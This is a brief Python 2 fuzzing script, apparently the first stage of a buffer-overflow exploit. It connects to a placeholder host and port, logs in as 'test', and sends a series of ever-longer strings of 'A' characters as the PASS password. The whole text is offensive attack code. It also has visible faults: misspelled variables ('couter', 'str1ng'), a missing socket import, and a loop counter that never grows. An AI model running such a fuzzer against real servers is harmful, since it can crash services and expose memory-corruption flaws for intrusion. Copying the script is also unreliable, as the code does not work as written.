#Array of no good, 1-5900
no_good = ['A']
counter = 100

while len(no_good) <= 30:
	no_good.append('A' * counter)
	couter = couter + 200

print '\nSending naughty buffer...'

for string in no_good:
	print 'Fuzzing PASS with %s bytes' %len(str1ng)
	
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('the_ip',the_port))
	data = s.recv(1024)
	
	s.send('USER test' + '\r\n')
	data = s.recv(1024)
	
	s.send('PASS ' + string + '\r\n')
	
	s.send('Quit\r\n')
	s.close()
